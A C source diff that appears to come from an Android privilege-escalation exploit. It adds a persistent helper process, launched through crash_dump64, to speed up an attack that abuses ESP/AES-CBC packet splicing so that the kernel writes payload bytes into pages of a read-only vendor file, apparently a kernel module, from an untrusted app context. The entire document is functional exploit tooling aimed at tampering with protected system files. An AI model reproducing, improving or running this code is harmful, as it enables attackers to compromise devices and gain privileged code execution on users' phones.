@@ -39,6 +39,120 @@ struct PatchRestore {
 
 static struct PatchRestore g_libcxx_r;
 
+/* ── Long-lived splicehelper daemon ──────────────────────────────────────────
+ * Instead of vfork+exec'ing crash_dump64 for every 16-byte block, we spawn
+ * ONE helper in daemon mode. It keeps the vendor file open and services
+ * read/splice requests over a 9-byte command pipe.
+ *
+ * Protocol (parent → helper, on cmd_fd):
+ *   [0]=cmd (0=read, 1=splice)  [1..8]=offset as uint64 little-endian
+ * Response (helper → parent):
+ *   read:  16 bytes on data_fd
+ *   splice: 16 bytes spliced into splice_fd (the main ESP pipe)
+ * ─────────────────────────────────────────────────────────────────────────── */
+struct HelperCtx {
+    int  pid;
+    int  cmd_fd;       /* parent writes 9-byte commands */
+    int  data_fd;      /* parent reads 16-byte responses (read mode) */
+    int  splice_fd;    /* helper's stdout → this is the main ESP pipe */
+    int  active;
+};
+
+static int helper_spawn(struct HelperCtx *h, const char *path, int esp_pipe_wr) {
+    int cmd_pipe[2], data_pipe[2];
+    if (pipe(cmd_pipe) < 0 || pipe(data_pipe) < 0) {
+        if (cmd_pipe[0] >= 0) { close(cmd_pipe[0]); close(cmd_pipe[1]); }
+        if (data_pipe[0] >= 0) { close(data_pipe[0]); close(data_pipe[1]); }
+        return -1;
+    }
+
+    int pid = (int)syscall(__NR_clone, SIGCHLD | CLONE_VM, 0, 0, 0, 0);
+    if (pid < 0) {
+        close(cmd_pipe[0]); close(cmd_pipe[1]);
+        close(data_pipe[0]); close(data_pipe[1]);
+        return -1;
+    }
+    if (pid == 0) {
+        /* Child: set up fds for daemon mode
+         * stdin  = cmd_pipe[0]   (commands from parent)
+         * stdout = esp_pipe_wr   (splice output → ESP pipe)
+         * stderr = data_pipe[1]  (read responses → parent's data_fd)
+         */
+        close(cmd_pipe[1]);
+        close(data_pipe[0]);
+        if (cmd_pipe[0] != 0 && dup2(cmd_pipe[0], 0) < 0) _exit(1);
+        if (esp_pipe_wr != 1 && dup2(esp_pipe_wr, 1) < 0) _exit(1);
+        if (data_pipe[1] != 2 && dup2(data_pipe[1], 2) < 0) _exit(1);
+        close(data_pipe[1]);
+        /* Close all other fds except 0,1,2 */
+        for (int fd = 3; fd < 1024; fd++) close(fd);
+        execl(kCrashDump, "crashdump64", "0", path, "d", NULL);
+        _exit(1);
+    }
+    /* Parent */
+    close(cmd_pipe[0]);
+    close(data_pipe[1]);
+    h->pid       = pid;
+    h->cmd_fd    = cmd_pipe[1];
+    h->data_fd   = data_pipe[0];
+    h->splice_fd = -1;  /* helper writes directly to esp_pipe_wr */
+    h->active    = 1;
+    return 0;
+}
+
+/* Send a command to the helper. Returns 0 on success. */
+static int helper_send_cmd(struct HelperCtx *h, int cmd, off64_t offset) {
+    unsigned char hdr[9];
+    hdr[0] = (unsigned char)cmd;
+    for (int i = 0; i < 8; i++)
+        hdr[i + 1] = (unsigned char)((uint64_t)offset >> (i * 8));
+    ssize_t w = 0;
+    while (w < 9) {
+        ssize_t n = write(h->cmd_fd, hdr + w, 9 - w);
+        if (n < 0) { if (errno == EINTR) continue; return -1; }
+        w += n;
+    }
+    return 0;
+}
+
+/* Read 16 bytes of file content from the helper (read mode). */
+static int helper_read(struct HelperCtx *h, off64_t offset, uint8_t buf[16]) {
+    if (helper_send_cmd(h, 0, offset) < 0) return -1;
+    ssize_t n = 0;
+    while (n < 16) {
+        ssize_t r = read(h->data_fd, buf + n, 16 - n);
+        if (r < 0) { if (errno == EINTR) continue; return -1; }
+        if (r == 0) return -1;  /* helper died */
+        n += r;
+    }
+    return 0;
+}
+
+/* Splice 16 bytes from the helper into the ESP pipe (splice mode).
+ * Sends the command, then reads a 1-byte ACK from the data pipe.
+ * The ACK guarantees the splice is complete before we proceed. */
+static int helper_splice(struct HelperCtx *h, off64_t offset) {
+    if (helper_send_cmd(h, 1, offset) < 0) return -1;
+    unsigned char ack;
+    ssize_t n = 0;
+    while (n < 1) {
+        ssize_t r = read(h->data_fd, &ack, 1);
+        if (r < 0) { if (errno == EINTR) continue; return -1; }
+        if (r == 0) return -1;  /* helper died */
+        n += r;
+    }
+    return ack ? 0 : -1;
+}
+
+static void helper_kill(struct HelperCtx *h) {
+    if (!h->active) return;
+    close(h->cmd_fd);
+    close(h->data_fd);
+    int st;
+    waitpid(h->pid, &st, 0);
+    h->active = 0;
+}
+
 /* IV = AES256_ECB_DEC(key, old_content) XOR desired
  * When kernel CBC-decrypts: plaintext = AES_DEC(key, ciphertext) XOR IV
  *   = AES_DEC(key, old_content) XOR IV
@@ -110,10 +224,12 @@ static int read_vendor_content(off_t offset, uint8_t buf[16]) {
 /* Write one ESP packet (40 bytes) into the pipe only (no socket splice).
  * ESP layout: SPI(4) + Seq(4) + IV(16) + ciphertext==file_page(16) = 40 bytes.
  * use_helper=0: splice file_fd page directly (system file, untrusted_app can open)
- * use_helper=1: exec crash_dump64 (splicehelper splice mode) to put vendor page in pipe
+ * use_helper=1 + helper!=NULL: send splice command to long-lived helper daemon
+ * use_helper=1 + helper==NULL: fallback to vfork+exec (one-shot mode)
  */
 static int do_one_write_cbc_pipe(int pipe_wr, int file_fd, off_t offset,
-                                  const uint8_t iv[16], int use_helper) {
+                                  const uint8_t iv[16], int use_helper,
+                                  struct HelperCtx *helper) {
     uint8_t hdr[24];
     *(uint32_t *)(hdr + 0) = htonl(g_spi);
     *(uint32_t *)(hdr + 4) = htonl(g_seq++);
@@ -125,20 +241,29 @@ static int do_one_write_cbc_pipe(int pipe_wr, int file_fd, off_t offset,
     }
 
     if (use_helper) {
-        char offstr[24];
-        snprintf(offstr, sizeof(offstr), "%ld", (long)offset);
-        int pid = (int)syscall(__NR_clone, SIGCHLD | CLONE_VFORK | CLONE_VM, 0, 0, 0, 0);
-        if (pid < 0) { printf("vfork failed: %s\n", strerror(errno)); return -1; }
-        if (pid == 0) {
-            if (pipe_wr != 1 && dup2(pipe_wr, 1) < 0) _exit(1);
-            execl(kCrashDump, "crashdump64", offstr, libcxx_ko_target, NULL);
-            _exit(1);
-        }
-        int st;
-        TEMP_FAILURE_RETRY(waitpid(pid, &st, 0));
-        if (!(WIFEXITED(st) && WEXITSTATUS(st) == 0)) {
-            printf("splice helper failed status=0x%x\n", st);
-            return -1;
+        if (helper) {
+            /* Fast path: long-lived daemon */
+            if (helper_splice(helper, offset) < 0) {
+                printf("helper_splice at 0x%lx failed\n", (long)offset);
+                return -1;
+            }
+        } else {
+            /* Fallback: one-shot vfork+exec */
+            char offstr[24];
+            snprintf(offstr, sizeof(offstr), "%ld", (long)offset);
+            int pid = (int)syscall(__NR_clone, SIGCHLD | CLONE_VFORK | CLONE_VM, 0, 0, 0, 0);
+            if (pid < 0) { printf("vfork failed: %s\n", strerror(errno)); return -1; }
+            if (pid == 0) {
+                if (pipe_wr != 1 && dup2(pipe_wr, 1) < 0) _exit(1);
+                execl(kCrashDump, "crashdump64", offstr, libcxx_ko_target, NULL);
+                _exit(1);
+            }
+            int st;
+            TEMP_FAILURE_RETRY(waitpid(pid, &st, 0));
+            if (!(WIFEXITED(st) && WEXITSTATUS(st) == 0)) {
+                printf("splice helper failed status=0x%x\n", st);
+                return -1;
+            }
         }
     } else {
         off_t off = offset;
@@ -215,6 +340,15 @@ static int patch_file_cbc(const char *path, const char *payload, size_t len,
         return -1;
     }
 
+    /* Spawn a long-lived helper daemon for vendor file access.
+     * Eliminates ~12,800 vfork+exec cycles for a 200 KB KO. */
+    struct HelperCtx helper = {0};
+    if (use_helper) {
+        if (helper_spawn(&helper, path, pfd[1]) < 0) {
+            printf("helper_spawn failed, falling back to one-shot mode\n");
+        }
+    }
+
     /* Batch size: 64 ESP packets (2560 bytes) per pipe→socket splice.
      * Reduces splice-to-socket syscalls by 64×. */
     enum { BATCH = 64 };
@@ -232,8 +366,15 @@ static int patch_file_cbc(const char *path, const char *payload, size_t len,
             uint8_t old_content[16] = {0};
 
             if (use_helper) {
-                if (read_vendor_content(off, old_content) < 0) {
-                    rc = -1; goto batch_done;
+                if (helper.active) {
+                    if (helper_read(&helper, off, old_content) < 0) {
+                        printf("helper_read at 0x%lx failed\n", (long)off);
+                        rc = -1; goto batch_done;
+                    }
+                } else {
+                    if (read_vendor_content(off, old_content) < 0) {
+                        rc = -1; goto batch_done;
+                    }
                 }
             } else {
                 if (pread(file_fd, old_content, 16, off) != 16) {
@@ -250,7 +391,8 @@ static int patch_file_cbc(const char *path, const char *payload, size_t len,
 
             int write_ok = 0;
             for (int attempt = 0; attempt < 3; attempt++) {
-                if (do_one_write_cbc_pipe(pfd[1], file_fd, off, iv, use_helper) == 0) {
+                if (do_one_write_cbc_pipe(pfd[1], file_fd, off, iv, use_helper,
+                                          helper.active ? &helper : NULL) == 0) {
                     write_ok = 1;
                     break;
                 }
@@ -278,6 +420,7 @@ batch_done:
         if (rc) break;
     }
 
+    helper_kill(&helper);
     close(pfd[0]); close(pfd[1]);
     if (!use_helper) close(file_fd);
     close(sk_send);
